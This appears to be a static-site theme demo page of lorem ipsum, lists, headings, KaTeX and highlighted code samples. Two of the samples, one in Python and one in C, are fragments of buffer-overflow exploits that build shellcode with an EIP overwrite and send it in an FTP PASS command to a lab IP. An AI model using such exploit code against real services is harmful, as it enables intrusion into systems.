+++
title = "HTML Elements Demo"
date = 2020-01-04

[taxonomies]
categories = ["Hello world"]
+++

Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nunc eu feugiat sapien. Aenean ligula nunc, laoreet id sem in, interdum bibendum felis. Donec vel dui neque. Praesent ac sem ut justo volutpat rutrum a imperdiet tellus. Nam lobortis massa non hendrerit hendrerit. Vivamus porttitor dignissim turpis, eget aliquam urna tincidunt non. Aliquam et fringilla turpis. Nullam eros est, eleifend in ornare sed, hendrerit eget est. Aliquam tellus felis, suscipit vitae ex vel, fringilla tempus massa. Nulla facilisi. Pellentesque lobortis consequat lectus. Maecenas ac libero elit.
<!-- more -->

1. Thing
2. Thing
3. Thing

- One
- Two
- Three

```python
for cat in cats:
    print(cat)
```

---

Inline: {{ katex(body="\KaTeX") }}

Block:

{% katex(block=true) %}\KaTeX{% end %}

---

Optionally, \\( \KaTeX \\) inline and: 

\\[ \KaTeX \\]

$$ \KaTeX $$

block-style automatic rendering is also supported, if enabled in the config.

---

## H2
### H3
#### H4
##### H5
###### H6

Ut luctus dolor ut tortor hendrerit, sed hendrerit augue scelerisque. [Suspendisse](https://datenstrom.io) quis sodales dui, at tempus ante. Nulla at tempor metus. Aliquam vitae rutrum diam. Curabitur iaculis massa dui, quis varius nulla finibus a. Praesent eu blandit justo. Suspendisse pharetra, arcu in rhoncus rutrum, magna magna viverra erat, eget vestibulum enim tellus id dui. Nunc vel dui et arcu posuere maximus. Mauris quam quam, bibendum sed libero nec, tempus hendrerit arcu. Suspendisse sed gravida orci. Fusce tempor arcu ac est pretium porttitor. Aenean consequat risus venenatis sem aliquam, at sollicitudin nulla semper. Aenean bibendum cursus hendrerit. Nulla congue urna nec finibus bibendum. Donec porta tincidunt ligula non ultricies.

> Quisque viverra a eros id auctor. Proin id nibh ut nisl dignissim pellentesque et ac mi. Nullam mattis urna quis consequat bibendum. Donec pretium dui elit, a semper purus tristique et. Mauris euismod nisl eu vehicula facilisis. Maecenas facilisis non massa non scelerisque. Integer malesuada cursus erat eu viverra. Duis ligula mi, eleifend vel justo id, laoreet porttitor ex. Etiam ultricies lacus lorem, sed aliquam nulla blandit in. Maecenas vel facilisis neque, vitae fringilla eros. In justo nibh, pellentesque sed faucibus nec, varius sit amet risus.

---

Some more code:

```python
def attack(offset, payload):
    """ Execute stage one and stage two shellcode.

    Overwriting past the range here causes the program to crash differently, so
    there are two stages of shellcode. The EIP register is overwritten to
    execute a JMP ESP command which brings us to the instruction directly after
    the offset and EIP overwrite, then stage one shellcode increments the EAX
    register which is pointing at the base of the buffer by 12 which sets it
    to just after the '\x11(setup sound ' string. Then stage two shellcode can
    be added to execute the desired payload.
    """
    print("[*] Payload set to attack")

    shellcode = get_shellcode(payload)
    print("[*] Read {} byte shellcode payload".format(len(shellcode)))

    buf = '\x11(setup sound ' 
    buf += shellcode                            # Inject shellcode
    buf += '\x41' * (offset-len(shellcode))     # Offset to EIP overwrite
    buf += struct.pack('<L', 0x08134597)        # Overwrite EIP with address to JMP ESP
    buf += '\x83\xc0\x0c'                       # ADD EAX,12 - pointer past 'setup sound'
    buf += '\xff\xe0'                           # JMP EAX - go to stage 2 (shellcode)
    buf += '\x90\x90'                           # OPcode padding
    buf += '\x90\x00#'

    crash = shellcode + "\x41" * (4368-105) + '\x97\x45\x13\x08' + "\x83\xc0\x0c\xff\xe0\x90\x90"
    buf = '\x11(setup sound ' + crash + '\x90\x00#'

    return buf
```

```rust
// Calculate the n-th Fibonacci number.
//
// Uses Binet's formula for a closed-form solution. First apply the
// equation then return the result rounded to the nearest integer.
fn nth_fib(n: i32) -> i64 {
    let nth = (PHI.powi(n) - PSI.powi(n)) / 5f64.sqrt();
    (nth.round() as i64)
}
```

```c
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2960);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(13);
    memset(nop, 0x00, 13);
    memset(nop, 0x90, 12);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    xs = conn("10.11.6.114");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
```

Sed vulputate tristique elit, eget pharetra elit sodales sed. Proin dignissim ipsum lorem, at porta eros malesuada sed. Proin tristique eros eu quam ornare, suscipit luctus mauris lobortis. Phasellus ut placerat enim. Donec egestas faucibus maximus. Nam quis efficitur eros. Cras tincidunt, lacus ac pretium porta, dui dolor varius elit, eget laoreet justo justo vitae metus. Morbi eget nisi ut ex scelerisque lobortis ut in lorem. Vestibulum et lorem quis ipsum feugiat varius. Mauris nec nulla viverra nisi porttitor efficitur. Morbi vel purus eleifend, finibus erat non, placerat ipsum. Mauris et augue vel nisi volutpat aliquam. Curabitur malesuada tortor est, at condimentum neque eleifend in.

Morbi id ornare lacus. Suspendisse ultrices rutrum posuere. Nullam porttitor libero quis ligula finibus semper. Mauris iaculis magna et nisl tristique, eget maximus ex feugiat. Nam eu felis leo. Quisque ultrices varius purus in molestie. Duis non accumsan ligula. Vivamus dignissim malesuada metus, vel hendrerit tellus viverra id. Curabitur posuere, mauris vitae dignissim dictum, velit mi condimentum lorem, nec varius velit arcu a mi. In dolor sapien, condimentum sed aliquam at, dignissim id purus. Cras lorem leo, vulputate ac ante sed, molestie tempus lectus. Curabitur efficitur libero quam, rhoncus faucibus libero pharetra nec. Curabitur lobortis ullamcorper nisl eu imperdiet. Duis porttitor interdum magna, ac eleifend orci consequat vitae. Aliquam augue felis, faucibus vel blandit sed, maximus non turpis.

Quisque viverra a eros id auctor. Proin id nibh ut nisl dignissim pellentesque et ac mi. Nullam mattis urna quis consequat bibendum. Donec pretium dui elit, a semper purus tristique et. Mauris euismod nisl eu vehicula facilisis. Maecenas facilisis non massa non scelerisque. Integer malesuada cursus erat eu viverra. Duis ligula mi, eleifend vel justo id, laoreet porttitor ex. Etiam ultricies lacus lorem, sed aliquam nulla blandit in. Maecenas vel facilisis neque, vitae fringilla eros. In justo nibh, pellentesque sed faucibus nec, varius sit amet risus.
